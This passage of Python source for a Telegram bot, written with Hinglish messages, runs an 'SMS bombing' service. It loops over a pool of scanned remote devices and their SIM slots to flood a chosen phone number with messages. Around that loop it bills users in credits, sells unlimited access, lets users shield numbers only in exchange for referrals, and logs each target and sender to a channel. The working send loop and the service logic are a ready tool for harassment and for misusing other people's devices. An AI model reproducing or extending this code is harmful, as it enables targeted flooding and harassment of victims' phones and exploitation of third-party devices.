        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count, F.text)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi device cached nahi dikh rahi — {em(EMOJI_GEAR, '🔄')} background scan chalu ho gaya (~3-4 min).\n\nThodi der baad <b>send sms</b> flow dobara start karo.",
            reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        session.blast_data = load()  # Load once at start of blast
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    unlimited_user = is_regular_user and has_unlimited(uid, load())
    current_credits = None if (not is_regular_user or unlimited_user) else get_user_credits(uid, load())

    # AIRTIGHT PROTECTION BACKSTOP (final guard) — number kisi bhi format mein ho
    # (+91 / 0091 / spaces / dashes) — normalized check. Protected number pe
    # sirf Owner ya khud protector bhej sakta hai — bypass impossible.
    _nn_backstop = norm_number(number)
    if _nn_backstop and _nn_backstop in PROTECTED_NUMBERS:
        _bs_prot = PROTECTED_NUMBERS[_nn_backstop]
        if not is_owner(uid, load()) and uid != _bs_prot:
            async with SESSIONS_LOCK:
                USER_SESSIONS.pop(uid, None)
            try:
                await msg.answer(
                    f"{em(EMOJI_LOCK, '🔒')} <b>Aborted — ye number protected hai!</b>\n\n"
                    f"SMS bhejna blocked (format-normalization check).\n"
                    f"Sirf Owner ya khud is number ko protect karne wala ispe bhej sakta hai.",
                    parse_mode="HTML"
                )
            except Exception:
                pass
            log.warning(f"[PROTECT] blast backstop blocked: uid={uid} number={_nn_backstop}")
            return

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                if not unlimited_user:
                                    # Use session-stored data instead of reloading from disk
                                    deduct_credits(uid, 1, session.blast_data)
                                session.blast_data["stats"]["total_sent"] = session.blast_data["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in session.blast_data["users"]:
                                    session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                                session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                                _hlist = session.blast_data["sms_history"][str(uid)]
                                if len(_hlist) > _SMS_HISTORY_MAX:
                                    del _hlist[:-_SMS_HISTORY_MAX]
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        # FIX: live counters — stop button pe sahi Sent/Failed dikhe
                        session.sent = sent_ok
                        session.failed = sent_fail

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if (is_regular_user and not unlimited_user) else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        _hlist2 = d_final["sms_history"][str(uid)]
        if len(_hlist2) > _SMS_HISTORY_MAX:
            del _hlist2[:-_SMS_HISTORY_MAX]
        save(d_final)
    else:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            # FIX: regular users ka "sent" bhi persist hota tha toh missing tha — ab dono save
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        if unlimited_user:
            _u_act, _u_days = unlimited_info(uid, load())
            _u_left = f"{sc('permanent (sab)')}" if _u_days is None else f"{_u_days} {sc('days left')}"
            credit_text = f"\n{em(EMOJI_CHECK, '🔓')} Unlimited Access — 0 {sc('credits used')} ({_u_left})"
        else:
            remaining = get_user_credits(uid, load())
            credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇr ᴘaɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("aᴅᴍɪɴ ᴘaɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("📤 sᴇɴᴅ aɴᴏᴛʜᴇr", "user:send", None, ""), btn("🏠 ʜᴏᴍᴇ", "user:home", None, "")]

    _bl_kb = InlineKeyboardMarkup(inline_keyboard=[back_btn])
    _bl_fallback = (
        f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
        f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
        f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
        f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
        f"{duration_text}{credit_text}"
    )
    try:
        _bl_title = ("✅" if (sent_fail == 0 and sent_ok > 0) else "⚠️" if sent_ok > 0 else "❌") + " SMS Blast Result"
        if was_cancelled:
            _bl_title += " — STOPPED BY USER"
        _bl_blocks = [
            rb_heading(_bl_title, 2),
            rb_para(f"📞 To: {mask_number(number)}"),
            rb_para(f"💬 Message: {message[:50]}{'...' if len(message) > 50 else ''}"),
            rb_para(f"✅ Sent: {sent_ok}    ❌ Failed: {sent_fail}"),
            rb_para(f"🔥 APIs used: {len(api_usage_delta)}    ⏱ {fmt_duration(int(time.time() - start_time))}"),
        ]
        if unlimited_user:
            _bl_blocks.append(rb_para("🔓 Unlimited Access — 0 credits used"))
        elif is_regular_user:
            _bl_blocks.append(rb_para(f"💰 Credits Used: {sent_ok}    💳 Remaining: {get_user_credits(uid, load())}"))
        await edit_rich_or_fallback(progress_msg, _bl_blocks, _bl_fallback, reply_markup=_bl_kb)
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await safe_answer(cq, "✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await safe_answer(cq, "🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()

    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return

    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await safe_answer(cq, "🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await safe_answer(cq, "🗑 All Videos Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await safe_answer(cq, "❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await safe_answer(cq, "📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number, F.text)
async def protect_number_done(msg: Message, state: FSMContext):
    """Owner (purana flow, unlimited) + USER (referral-gated slots) dono yahan."""
    d = load()
    uid = msg.from_user.id
    owner_mode = is_owner(uid, d)
    if not owner_mode and d.get("users", {}).get(str(uid)) is None:
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    _nn_prot = norm_number(number)
    if not _nn_prot:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. 10-digit India number do (e.g. +919876543210).", parse_mode="HTML")
        return

    if owner_mode:
        PROTECTED_NUMBERS[_nn_prot] = uid
        d["protected_numbers"] = PROTECTED_NUMBERS
        log_activity(d, "number_protected", uid, f"Protected {_nn_prot}")
        save(d)
        await state.clear()
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"
            f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>\n\n"
            f"Ab sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    # ── USER MODE: referral-gated (1 successful referral = 1 slot) ──
    udata = d["users"].get(str(uid), {})
    slots = int(udata.get("ref_count", 0))
    my_prot = list(udata.get("protected_numbers", []))
    if _nn_prot in my_prot:
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Ye number aapne pehle se protect kar diya hai!", parse_mode="HTML")
        return
    if len(my_prot) >= slots:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} <b>Slots full!</b>\n\n"
            f"🪙 Aapke slots: <b>{len(my_prot)}/{slots}</b>\n"
            f"👥 1 successful referral = 1 slot. Zyada referrals karo, aur slots unlock honge.",
            parse_mode="HTML"
        )
        return
    PROTECTED_NUMBERS[_nn_prot] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    my_prot.append(_nn_prot)
    udata["protected_numbers"] = my_prot
    log_activity(d, "user_number_protected", uid, f"Protected {_nn_prot}")
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{_nn_prot}</code>\n"
        f"{em(EMOJI_MONEY, '🪙')} Slots: <b>{len(my_prot)}/{slots}</b>\n\n"
        f"Ab sirf <b>aap + Owner</b> is number pe SMS bhej sakte hain.\n"
        f"Koi bhi user/admin (+91 ya bina 91, kisi bhi format) bypass nahi kar sakta.",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:protect")
async def user_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d.get("users", {}).get(str(uid), {})
    slots = int(udata.get("ref_count", 0))
    my_prot = udata.get("protected_numbers", [])
    if len(my_prot) >= slots:
        await safe_answer(cq, f"❌ Slots full ({len(my_prot)}/{slots})! Zyada referrals karo — 1 referral = 1 slot.", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect My Number</b>\n\n"
        f"Jis number ko protect karna hai enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"{em(EMOJI_MONEY, '🪙')} Slots: <b>{len(my_prot)}/{slots}</b> (1 referral = 1 slot)\n"
        f"{em(EMOJI_SHIELD, '🛡️')} Protected number pe sirf aap + Owner SMS bhej sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:protected")
async def user_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d.get("users", {}).get(str(uid), {})
    slots = int(udata.get("ref_count", 0))
    my_prot = list(udata.get("protected_numbers", []))
    lines = [
        f"{em(EMOJI_LOCK, '🔐')} <b>My Protected Numbers</b>\n",
        f"👥 {sc('aapke referrals')} : <b>{slots}</b> (1 referral = 1 slot)\n",
        f"{em(EMOJI_LOCK, '🔒')} Protected : <b>{len(my_prot)}</b> / {slots}\n",
        "━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for i, pn in enumerate(my_prot, 1):
        lines.append(f"{i}. {em(EMOJI_PHONE, '📞')} <code>{pn}</code>")
    if not my_prot:
        lines.append(f"(abhi koi number protected nahi — {em(EMOJI_MONEY, '🪙')} slots unlock karne ke liye referrals karo)")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"{em(EMOJI_SHIELD, '🛡️')} In numbers pe sirf aap + Owner SMS bhej sakte hain.")
    rows = []
    for i in range(len(my_prot)):
        rows.append([btn(f"🗑 remove #{i+1}", f"user:protect_del:{i}", EMOJI_CROSS, "🗑")])
    rows.append([btn("🔒 add new", "user:protect", EMOJI_LOCK, "➕"), btn(f"🔙 {sc('back')}", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )


@R.callback_query(F.data.startswith("user:protect_del:"))
async def user_protect_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d.get("users", {}).get(str(uid), {})
    my_prot = list(udata.get("protected_numbers", []))
    try:
        idx = int(cq.data.split(":")[-1])
    except Exception:
        return
    if not (0 <= idx < len(my_prot)):
        await safe_answer(cq, "❌ Number list mein nahi mila!", show_alert=True)
        return
    norm = my_prot[idx]
    if PROTECTED_NUMBERS.get(norm) != uid:
        # Owner ne same number protect kiya hai (owner ke paas priority) — user nahi hata sakta
        await safe_answer(cq, "⚠️ Ye number abhi Owner ke protection mein hai — remove nahi kar sakte.", show_alert=True)
        return
    PROTECTED_NUMBERS.pop(norm, None)
    d["protected_numbers"] = PROTECTED_NUMBERS
    my_prot.pop(idx)
    udata["protected_numbers"] = my_prot
    save(d)
    await safe_answer(cq, f"✅ Number unprotect ho gaya!", show_alert=True)
    await user_protected_list(cq, state)


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})

    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)

    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)

        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")

        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )

    rows = []
    if is_owner_user:
        rows.append([btn("rᴇᴍᴏᴠᴇ ᴘrᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await safe_answer(cq, "❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙaᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    _pn_dict = d.get("protected_numbers", {})
    _nn_rm = norm_number(number)
    _rm_key = next((k for k in _pn_dict if norm_number(k) == _nn_rm), None)
    if _rm_key is not None:
        del _pn_dict[_rm_key]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = {norm_number(k): v for k, v in _pn_dict.items() if norm_number(k)}
        await safe_answer(cq, f"✅ Protection removed for {_nn_rm or number}!", show_alert=True)
    else:
        await safe_answer(cq, "❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
        f"Jis number ki tracking karni hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Is number se SMS bhejne wale users ka pata chalega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number, F.text)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []

    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break

    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")

    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")

    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount, F.text)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d, is_manual=True)
        count += 1

